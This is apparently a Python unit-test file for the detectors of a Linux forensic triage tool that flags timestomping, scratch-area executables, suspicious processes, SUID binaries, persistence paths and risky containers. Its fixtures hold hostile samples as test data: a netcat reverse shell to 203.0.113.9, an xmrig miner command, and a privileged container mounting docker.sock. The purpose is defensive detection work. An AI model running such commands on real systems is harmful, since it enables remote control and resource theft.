"""Unit tests for step-7c detectors plus e2e infected/clean assertions."""

from __future__ import annotations

from datetime import UTC, datetime

from linuxdfir.detectors import (
    executables_in_dev_shm,
    recent_changes_in_sensitive_paths,
    suspicious_containers,
    suspicious_processes,
    timestomp_detection,
    unusual_suid,
)
from linuxdfir.schema import Event, Severity

NEW_RULES = {
    "timestomp_detection",
    "executables_in_dev_shm",
    "suspicious_processes",
    "unusual_suid",
    "recent_changes_in_sensitive_paths",
    "suspicious_containers",
}


def _event(**kw) -> Event:
    defaults = dict(
        timestamp_utc=None,
        host="test",
        user=None,
        source_artifact="test",
        event_type="test",
        message="",
        evidence_path="/test",
        line_or_offset=1,
    )
    defaults.update(kw)
    return Event(**defaults)


def _tmp_file(path, *, mode="0o644", uid="0", size="100",
              mtime="2026-01-02T03:15:00Z", ctime="2026-01-02T03:15:00Z",
              tags=None):
    return _event(
        event_type="tmp_area_file",
        message=(
            f"tmp-area type=file mode={mode} uid={uid} gid=0 size={size} "
            f"mtime_utc={mtime} ctime_utc={ctime} atime_utc={mtime} path={path}"
        ),
        tags=["triage", "tmp-area"] + (tags or []),
    )


def _recent(path, *, mtime="2026-01-02T03:15:00Z", type_="file", mode="0o644", uid="0"):
    return _event(
        event_type="recent_file",
        message=(
            f"recent type={type_} mode={mode} uid={uid} gid=0 size=88 "
            f"mtime_utc={mtime} ctime_utc={mtime} atime_utc={mtime} path={path}"
        ),
        tags=["triage", "recent"],
    )


def _process(user, pid, command):
    return _event(
        event_type="process",
        message=f"process {user} pid={pid}: {command}",
        tags=["process", "depth:0"],
        timestamp_utc=datetime(2026, 1, 3, 6, 0, 0, tzinfo=UTC),
    )


def _ss(state, local, process="-"):
    return _event(
        event_type="ss_socket",
        message=f"ss {state} netid=tcp local={local} peer=0.0.0.0:* process={process}",
        tags=["network", "ss", state.lower()],
        timestamp_utc=datetime(2026, 1, 3, 6, 0, 0, tzinfo=UTC),
    )


# --------------------------------------------------- executables_in_dev_shm


class TestExecutablesInDevShm:
    def test_hidden_elf_fires_high(self):
        e = _tmp_file("/dev/shm/.cache/upd", mode="0o666", size="4096",
                      tags=["elf"])
        findings = executables_in_dev_shm.detect([e])
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert "hidden-path" in findings[0].description
        assert "elf-content" in findings[0].description

    def test_exec_bit_fires(self):
        e = _tmp_file("/tmp/update.bin", mode="0o755")
        findings = executables_in_dev_shm.detect([e])
        assert len(findings) == 1
        assert "exec-bit" in findings[0].description

    def test_plain_file_no_finding(self):
        e = _tmp_file("/tmp/readme.txt", mode="0o644")
        assert executables_in_dev_shm.detect([e]) == []

    def test_placeholder_allowlisted(self):
        e = _tmp_file("/tmp/.placeholder", mode="0o755", tags=["elf"])
        assert executables_in_dev_shm.detect([e]) == []

    def test_directory_skipped(self):
        e = _event(
            event_type="tmp_area_file",
            message="tmp-area type=dir mode=0o755 uid=0 gid=0 size=40 "
                    "mtime_utc=2026-01-02T03:15:00Z path=/tmp/.hidden",
            tags=["triage", "tmp-area"],
        )
        assert executables_in_dev_shm.detect([e]) == []


# --------------------------------------------------------- timestomp_detection


class TestTimestomp:
    def test_gap_high_in_scratch(self):
        e = _tmp_file("/var/tmp/.systemd-private-9x2k/payload",
                      mtime="2024-11-29T00:00:00Z", ctime="2026-10-14T00:00:00Z")
        findings = timestomp_detection.detect([e])
        gap = [f for f in findings if "Timestomp indicator" in f.title]
        assert gap and gap[0].severity == Severity.HIGH

    def test_gap_low_outside_scratch_fp_mentioned(self):
        e = _event(
            event_type="recent_file",
            message=("recent type=file mode=0o644 uid=1000 gid=1000 size=900 "
                     "mtime_utc=2024-11-29T00:00:00Z ctime_utc=2026-10-14T00:00:00Z "
                     "atime_utc=2024-11-29T00:00:00Z path=/home/alice/tool.tgz"),
            tags=["triage", "recent"],
        )
        findings = timestomp_detection.detect([e])
        gap = [f for f in findings if "Timestomp indicator" in f.title]
        assert gap and gap[0].severity == Severity.LOW
        assert "rsync -a" in gap[0].description or "package" in gap[0].description

    def test_close_ctime_mtime_no_gap(self):
        e = _tmp_file("/tmp/safe.txt", mtime="2026-01-02T03:15:00Z",
                      ctime="2026-01-02T03:15:10Z")
        assert timestomp_detection.detect([e]) == []

    def test_cohort_outlier_low(self):
        events = [
            _recent("/etc/app/config.conf", mtime="2025-06-01T00:00:00Z"),
            _recent("/etc/app/new1.conf", mtime="2026-01-02T00:00:00Z"),
            _recent("/etc/app/new2.conf", mtime="2026-01-02T01:00:00Z"),
            _recent("/etc/app/new3.conf", mtime="2026-01-02T02:00:00Z"),
        ]
        findings = timestomp_detection.detect(events)
        cohort = [f for f in findings if "Cohort timestomp outlier" in f.title]
        assert cohort and cohort[0].severity == Severity.LOW
        assert "config.conf" in cohort[0].title

    def test_var_log_excluded_from_cohort(self):
        events = [
            _recent("/var/log/old.log", mtime="2025-06-01T00:00:00Z"),
            _recent("/var/log/new1.log", mtime="2026-01-02T00:00:00Z"),
            _recent("/var/log/new2.log", mtime="2026-01-02T01:00:00Z"),
            _recent("/var/log/new3.log", mtime="2026-01-02T02:00:00Z"),
        ]
        assert timestomp_detection.detect(events) == []


# ------------------------------------------------------- suspicious_processes


class TestSuspiciousProcesses:
    def test_scratch_path_high(self):
        findings = suspicious_processes.detect([_process("root", 4152, "/tmp/.x/x --daemon")])
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH

    def test_reverse_shell_high(self):
        e = _process("root", 4153, "nc -e /bin/bash 203.0.113.9 4444")
        findings = suspicious_processes.detect([e])
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert findings[0].mitre_ids == ["T1059.004"]

    def test_miner_high(self):
        e = _process("alice", 5001, "xmrig --url=stratum+tcp://pool.example.com:3333")
        findings = suspicious_processes.detect([e])
        assert findings and findings[0].severity == Severity.HIGH

    def test_deleted_high(self):
        e = _process("root", 6001, "/usr/bin/vim (deleted)")
        findings = suspicious_processes.detect([e])
        assert findings and findings[0].severity == Severity.HIGH
        assert findings[0].mitre_ids == ["T1055"]

    def test_bracket_masquerade_medium(self):
        e = _process("root", 6002, "[kworker/0:1] /var/lib/.x/real")
        findings = suspicious_processes.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM
        assert findings[0].mitre_ids == ["T1036"]

    def test_unexpected_listener(self):
        findings = suspicious_processes.detect([_ss("LISTEN", "0.0.0.0:8080", "upd/4152")])
        assert len(findings) == 1
        assert findings[0].severity == Severity.MEDIUM
        assert "8080" in findings[0].title

    def test_allowed_listener_no_finding(self):
        assert suspicious_processes.detect([_ss("LISTEN", "0.0.0.0:22", "sshd/900")]) == []
        assert suspicious_processes.detect([_ss("LISTEN", "0.0.0.0:80", "nginx/7")]) == []

    def test_estab_ignored(self):
        assert suspicious_processes.detect([_ss("ESTAB", "10.0.1.5:22", "sshd/900")]) == []

    def test_benign_process_no_finding(self):
        events = [
            _process("root", 1, "/sbin/init"),
            _process("root", 412, "/usr/sbin/cron -f"),
            _process("root", 5000, "nginx: worker process"),
        ]
        assert suspicious_processes.detect(events) == []


# --------------------------------------------------------------- unusual_suid


class TestUnusualSuid:
    def test_allowlisted_sudo_silent(self):
        e = _event(
            event_type="suid_sgid_file",
            message="suid_sgid_file mode=0o4755 uid=0 gid=0 size=200000 "
                    "mtime_utc=2026-01-01T00:00:00Z flags=suid type=file path=/usr/bin/sudo",
            tags=["triage", "suid"],
        )
        assert unusual_suid.detect([e]) == []

    def test_writable_path_high(self):
        e = _event(
            event_type="suid_sgid_file",
            message="suid_sgid_file mode=0o4755 uid=0 gid=0 size=12000 "
                    "mtime_utc=2026-01-02T03:15:00Z flags=suid type=file path=/tmp/sudo",
            tags=["triage", "suid"],
        )
        findings = unusual_suid.detect([e])
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert findings[0].mitre_ids == ["T1548.001"]

    def test_custom_suid_medium_aggregated(self):
        events = [
            _event(
                event_type="suid_sgid_file",
                message=f"suid_sgid_file mode=0o4755 uid=0 gid=0 size=9000 "
                        f"mtime_utc=2026-01-01T00:00:00Z flags=suid type=file path={path}",
                tags=["triage", "suid"],
            )
            for path in ("/opt/app/backdoor", "/usr/local/bin/helper")
        ]
        findings = unusual_suid.detect(events)
        assert len(findings) == 1
        assert findings[0].severity == Severity.MEDIUM
        assert findings[0].count == 2


# -------------------------------------------- recent_changes_in_sensitive_paths


class TestRecentSensitiveChanges:
    def test_cron_high(self):
        findings = recent_changes_in_sensitive_paths.detect([_recent("/etc/cron.d/evil")])
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert findings[0].mitre_ids == ["T1053.003"]

    def test_ld_preload_high(self):
        findings = recent_changes_in_sensitive_paths.detect([_recent("/etc/ld.so.preload")])
        assert findings and findings[0].severity == Severity.HIGH
        assert findings[0].mitre_ids == ["T1574.006"]

    def test_profile_d_medium(self):
        findings = recent_changes_in_sensitive_paths.detect([_recent("/etc/profile.d/evil.sh")])
        assert findings and findings[0].severity == Severity.MEDIUM
        assert findings[0].mitre_ids == ["T1546.004"]

    def test_allowlisted_names_silent(self):
        for name in ("apt-compat", "logrotate", ".placeholder", "hardening.sh"):
            e = _recent(f"/etc/cron.daily/{name}")
            assert recent_changes_in_sensitive_paths.detect([e]) == [], name

    def test_unconfigured_path_ignored(self):
        assert recent_changes_in_sensitive_paths.detect([_recent("/etc/hosts")]) == []

    def test_directory_included(self):
        e = _recent("/etc/cron.d/backup", type_="dir")
        findings = recent_changes_in_sensitive_paths.detect([e])
        assert findings and findings[0].severity == Severity.HIGH


# -------------------------------------------------------- suspicious_containers


class TestSuspiciousContainers:
    def _container(self, image, row=None, names="web", cid="a1b2c3d4e5f6"):
        row = row or f'{cid} {image} "cmd" 2 weeks ago Up 2 weeks 80/tcp {names}'
        return _event(
            event_type="container_row",
            message=f"container id={cid} image={image} names={names} row={row.replace(' ', '_')}",
            tags=["containers", "docker"],
            timestamp_utc=datetime(2026, 1, 3, 6, 0, 0, tzinfo=UTC),
        )

    def test_allowlisted_nginx_silent(self):
        assert suspicious_containers.detect([self._container("nginx")]) == []

    def test_unknown_image_medium(self):
        findings = suspicious_containers.detect([self._container("evilminer/xmrig:latest")])
        assert len(findings) == 1
        assert findings[0].severity == Severity.MEDIUM
        assert findings[0].mitre_ids == ["T1610"]

    def test_privileged_high(self):
        row = 'a1b2c3d4e5f6 evil/x --privileged -v /var/run/docker.sock:/var/run/docker.sock web'
        findings = suspicious_containers.detect([self._container("evil/x", row=row)])
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH


# ------------------------------------------------------------------ e2e 7c


class TestEndToEnd7C:
    def _parsed(self, archive, tmp_path):
        import json

        from linuxdfir import cli
        from linuxdfir.schema import Event

        out = tmp_path / "parsed"
        assert cli.main(["parse", str(archive), "-o", str(out)]) == 0
        lines = (out / "events.jsonl").read_text(encoding="utf-8").splitlines()
        return [Event.from_dict(json.loads(line)) for line in lines if line.strip()]

    def test_infected_triggers_scratch_findings(self, generated, tmp_path):
        archive = generated["results"]["infected"]["archive"]
        parsed = self._parsed(archive, tmp_path)
        timestomp = timestomp_detection.detect(parsed)
        assert timestomp, "infected host must produce timestomp findings"
        assert any(f.severity == Severity.HIGH for f in timestomp)
        scratch = executables_in_dev_shm.detect(parsed)
        assert scratch, "infected host must produce scratch-executable findings"
        processes = suspicious_processes.detect(parsed)
        assert len(processes) >= 3, f"expected process findings, got {len(processes)}"

    def test_clean_zero_new_rule_findings(self, generated, tmp_path):
        archive = generated["results"]["clean"]["archive"]
        parsed = self._parsed(archive, tmp_path)
        for detector in (
            timestomp_detection,
            executables_in_dev_shm,
            suspicious_processes,
            unusual_suid,
            recent_changes_in_sensitive_paths,
            suspicious_containers,
        ):
            findings = detector.detect(parsed)
            assert findings == [], f"{detector.RULE}: expected zero on clean, got {len(findings)}"
